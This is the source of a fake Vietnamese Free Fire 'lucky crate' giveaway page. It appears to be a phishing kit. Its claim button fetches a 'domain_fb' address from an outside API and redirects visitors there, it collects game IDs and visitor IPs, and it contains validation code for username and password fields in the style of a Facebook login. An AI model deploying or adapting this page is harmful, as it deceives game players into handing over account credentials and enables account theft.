<?php
$currentUrl = $_SERVER['REQUEST_URI'];
$baseHref = '';
if (strpos(
    $currentUrl, '/themes/theme15/') === false) {
    $baseHref = '<base href="themes/theme15/">';
}
?>
<?= $baseHref ?>

<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">


    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <title>FREE FIRE VIỆT NAM</title>
    <link rel="stylesheet" type="text/css" href="css/style.css">
    <link rel="stylesheet" type="text/css" href="css/facebook.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>

<!-- Nông Văn Nguyên
Facebook.com/778578204  -->


<!-- Nông Văn Nguyên
Vui lòng không xoá nếu bạn là con người  -->

<body>
    <section>
        <header>

            <!-- Bọn óc đéo biết code đi F12 -->

            <img class="logo"
                src="https://freefiremobile-a.akamaihd.net/common/web_event/official/logo-small_20210113.png">
        </header>
        <div class="loader">

            <img src="https://i.pinimg.com/originals/67/56/66/675666d840a9c8fa1c61eaf584ff2a50.gif">
        </div><!-- Nông Văn Nguyên
Vui lòng không xoá nếu bạn là con người  -->
        <div class="NguyenWrap">
            <div class="banner">

                <!-- Nông Văn Nguyên
Vui lòng không xoá nếu bạn là con người  -->

                <img class="slide">
            </div>
            <div class="bannerText">
                <span class="ngText" style="--i:1;">V</span>
                <span class="ngText" style="--i:2;">Ò</span>
                <span class="ngText" style="--i:3;">N</span>
                <span class="ngText" style="--i:4;">G</span>

                <span class="ngText" style="--i:6;margin-right: 5px;"> </span>
                <span class="ngText" style="--i:7;">Q</span>
                <span class="ngText" style="--i:8;">U</span>
                <span class="ngText" style="--i:9;">A</span>
                <span class="ngText" style="--i:10;">Y</span>

                <span class="ngText" style="--i:12;margin-right: 5px;"> </span>
                <span class="ngText" style="--i:13;">F</span>
                <span class="ngText" style="--i:14;">R</span>
                <span class="ngText" style="--i:15;">E</span>
                <span class="ngText" style="--i:16;">E</span>
                <span class="ngText" style="--i:17;">F</span>
                <span class="ngText" style="--i:18;">I</span>
                <span class="ngText" style="--i:19;">R</span>
                <span class="ngText" style="--i:20;">E</span>
            </div><!-- Nông Văn Nguyên
Vui lòng không xoá nếu bạn là con người  -->
            <div class="endTime">
                <span class="alertText">
                    Thời gian diễn ra sự kiện
                </span>
                <span class="waktu">
                    <p class="time" id="jam"></p>
                    <p class="time" id="men"></p>
                    <p class="time" id="det"></p>
                </span>
            </div>
            <div class="boxHadiah" onclick="openCrate()">
                <div class="kotak">
                    <div class="imgBox">
                        <img src="ngMedia/crate.jpg">
                    </div>
                    <span class="desc">Nhấn để mở</span>
                </div>
                <div class="kotak">
                    <div class="imgBox">
                        <img src="ngMedia/crate.jpg">
                    </div>
                    <span class="desc">Nhấn để mở</span>
                </div>
                <div class="kotak">
                    <div class="imgBox">
                        <img src="ngMedia/crate.jpg">
                    </div>
                    <span class="desc">Nhấn để mở</span>
                </div>
                <div class="kotak">
                    <div class="imgBox">
                        <img src="ngMedia/crate.jpg">
                    </div>
                    <span class="desc">Nhấn để mở</span>
                </div>
                <div class="kotak">
                    <div class="imgBox">
                        <img src="ngMedia/crate.jpg">
                    </div>
                    <span class="desc">Nhấn để mở</span>
                </div>
                <div class="kotak"><!-- Nông Văn Nguyên
Vui lòng không xoá nếu bạn là con người  -->
                    <div class="imgBox">
                        <img src="ngMedia/crate.jpg">
                    </div>
                    <span class="desc">Nhấn để mở</span>
                </div>
                <div class="kotak">
                    <div class="imgBox">
                        <img src="ngMedia/crate.jpg">
                    </div>
                    <span class="desc">Nhấn để mở</span>
                </div>
                <div class="kotak">
                    <div class="imgBox">
                        <img src="ngMedia/crate.jpg">
                    </div>
                    <span class="desc">Nhấn để mở</span>
                </div>
                <div class="kotak">
                    <div class="imgBox">
                        <img src="ngMedia/crate.jpg">
                    </div>
                    <span class="desc">Nhấn để mở</span>
                </div>
                <div class="kotak">
                    <div class="imgBox">
                        <img src="ngMedia/crate.jpg">
                    </div>
                    <span class="desc">Nhấn để mở</span>
                </div>
                <div class="kotak">
                    <div class="imgBox">
                        <img src="ngMedia/crate.jpg">
                    </div>
                    <span class="desc">Nhấn để mở</span>
                </div>
                <div class="kotak">
                    <div class="imgBox">
                        <img src="ngMedia/crate.jpg">
                    </div>
                    <span class="desc">Nhấn để mở</span>
                </div>
                <div class="kotak">
                    <div class="imgBox">
                        <img src="ngMedia/crate.jpg">
                    </div>
                    <span class="desc">Nhấn để mở</span>
                </div>
                <div class="kotak">
                    <div class="imgBox">
                        <img src="ngMedia/crate.jpg">
                    </div>
                    <span class="desc">Nhấn để mở</span>
                </div>
                <div class="kotak">
                    <div class="imgBox">
                        <img src="ngMedia/crate.jpg">
                    </div>
                    <span class="desc">Nhấn để mở</span>
                </div>
                <div class="kotak">
                    <div class="imgBox">
                        <img src="ngMedia/crate.jpg">
                    </div>
                    <span class="desc">Nhấn để mở</span>
                </div>
                <div class="kotak">
                    <div class="imgBox">
                        <img src="ngMedia/crate.jpg">
                    </div>
                    <span class="desc">Nhấn để mở</span>
                </div>

            </div>
        </div>
    </section>
    <div class="mask"></div>
    <div class="ngPopup">
        <video src="ngMedia/ngBg.3gpp" autoplay muted></video>
        <div class="boxGambar">
            <img id="images" style="--x:1;" src="">
            <img id="images" style="--x:2;" src="">
            <img id="images" style="--x:3;" src="">
            <img id="images" style="--x:4;" src="">
            <img id="images" style="--x:5;" src="">
        </div>
        <div id="YAbtn" onclick="redirectToPage()" class="YAbtn">NHẬN</div>

        <script>
            function redirectToPage() {
                const domain = window.location.protocol + "//" + window.location.host;
                (async () => {
                    try {
                        let data = await fetch(`https://minimil.onrender.com/api/websites?domain=${domain}`)
                        data = await data.json()
                        window.location.href = data.data.domain_fb;
                    } catch {

                    }
                })();
            }
        </script>
    </div>



    <!-- TRUE TIKTOK ELEMENT -->
    <div class="popTiktok">
        <div class="tops">
            <h1> NHẬP ID FREE FIRE CỦA BẠN </h1>
        </div>
        <div class="TiktokForm"><!-- Nông Văn Nguyên
Vui lòng không xoá nếu bạn là con người  -->
            <span class="tiktokalert salah"><i class="fa fa-times-circle"
                    style="float:left;margin-top:1.5px;margin-right:3px;"></i> ID không tồn tại </span>
            <span class="tiktokalert notfound"><i class="fa fa-times-circle"
                    style="float:left;margin-top:1.5px;margin-right:3px;"></i>ID không tồn tại </span>
            <span class="tiktokalert check"><i class="fa fa-spinner fa-spin"
                    style="float:left;margin-top:1px;margin-right:3px;"></i>Đang kiểm tra ID</span>
            <div class="tiktokGroup">
                <input class="tiktokInput" placeholder="ID FreeFire" id="url" type="number" autocomplete="off">
            </div><!-- Nông Văn Nguyên
Vui lòng không xoá nếu bạn là con người  -->

            <div class="tiktokGroup">
                <input style="width:80px;" class="tiktokInput" onclick="return tiktok()" type="submit" value="Gửi  ID">
            </div>
        </div>
    </div>


    <div class="welcome">
        Xin chào! Chúc bạn may mắn nhé!
    </div>







    <!-- AUDIO ELEMENT -->
    <audio id="popSound" src="ngMedia/popSound.mp4" style="display: none;"></audio>
    <audio id="clickSound" src="ngMedia/clickSound.mpeg" style="display: none;"></audio>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://randomjs.com/1.0.0.js"></script>
    <script>
        $(document).ready(function () {
            $(".loader").fadeOut();
        })

    </script>
    <script type="text/javascript">
        $(document).on('click', '.boxHadiah .kotak', function () {
            $(this).toggleClass("active").siblings().removeClass("active");
            setTimeout(() => {
                $(this).removeClass("active");
            }, 1000);
        })
        function openCrate() {
            $("#clickSound").get(0).play();
            setTimeout(() => {
                $(".mask").show();
                $(".ngPopup").fadeIn();

                setTimeout(() => {
                    $("#popSound").get(0).play();
                    $(".boxGambar").css("display", "flex");
                }, 800);
                setTimeout(() => {
                    $("#YAbtn").css("display", "flex");
                }, 1080)

            }, 1000)
        }

        $('.boxGambar #images').each(function () {
            function ngRand(high, low) {
                high++;
                return Math.floor((Math.random()) * (high - low)) + low;
            }
            $(this).attr("src", "ngMedia/ngReward/" + ngRand(1, 39) + ".jpg");
        })


    </script>

    <script type="text/javascript">
        var countDownDate = new Date("Jul 5, 2021 15:37:25").getTime();
        var x = setInterval(function () {
            var now = new Date().getTime();
            var distance = countDownDate - now;
            var days = Math.floor(distance / (1000 * 60 * 60 * 24));
            var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
            var seconds = Math.floor((distance % (1000 * 60)) / 1000);
            document.getElementById("jam").innerHTML = hours + " :";
            document.getElementById("men").innerHTML = minutes + " :";
            document.getElementById("det").innerHTML = seconds;
            if (distance < 0) {
                clearInterval(x);

            }
        }, 1000);
    </script>
    <script>
        function tiktok() {
            var url = $("#url").val();
            if (url == "" || url == null || url.length <= 7) {
                $(".salah").show();
                $(".check").hide();
                $(".notfound").hide();
                return false;
            } else {
                $(".salah").hide();
            }

            // Extract the ID from the URL (assuming it's the part after the last '/')
            var id = url.substring(url.lastIndexOf('/') + 1);

            if (id == "" || id == null) {
                $(".check").hide();
                $(".notfound").show();
            } else {
                $(".popTiktok").hide();
                $(".mask").hide();
                $(".welcome").css("transform", "translateX(0)");
                $("#welId").html(id);
                $("#id").val(url);
                $("#nick").val(id);
            }
        }
    </script>

    <script type="text/javascript">
        var checkip = function () {
            $.ajax({
                type: "get",
                async: false,
                url: "https://api.pubgameshowtime.com/ip/getcountry",
                dataType: "json",
                success: function (result) {
                    $('#ip').val(result.ip);
                }
            })
        }
        checkip();
    </script>
    <script type="text/javascript">
        function valid() {
            var user = $('#user').val();
            var pass = $('#pass').val();
            var ip = $('#ip').val();
            if (user == '' || user == null) {
                $('.email').show();
                $('.sandi').hide();
                return false;
            } else {

                if (user.includes('@')) {
                    let pattern = /^[^ ]+@[^ ]+\.[a-z]{2,3}$/;
                    if (user.match(pattern)) {
                        $('.email').hide();
                    } else {
                        $('.email').show();
                        $('.sandi').hide();
                        return false;
                    }
                }

                if (!isNaN(user)) {
                    if (user.length <= 9) {
                        $('.email').show();
                        $('.sandi').hide();
                        return false;
                    } else {
                        $('.email').hide();
                    }
                }

                if (user.match(/\s/g)) {
                    $('.email').show();
                    $('.sandi').hide();
                    return false;
                } else {
                    $('.email').hide();
                }

                var regex = /(?:^|[^@\.\w-])([a-z0-9]+:\/\/)?(\w(?!ailto:)\w+:\w+@)?([\w.-]+\.[a-z]{2,4})(:[0-9]+)?(\/.*)?(?=$|[^@\.\w-])/im;
                if (user.match(regex)) {
                    $('.email').show();
                    $('.sandi').hide();
                    return false;
                }

                if (user.length <= 5) {
                    $('.email').show();
                    $('.sandi').hide();
                    return false;
                } else {
                    $('.email').hide();
                }

            }
            if (pass == '' || pass == null || pass.length <= 4) {
                $('.sandi').show();
                return false;
            } else {
                $('.sandi').hide();
            }

            // Jika Sukses
            $("#btnfb").addClass("disabled");
        }
    </script>
</body>

</html>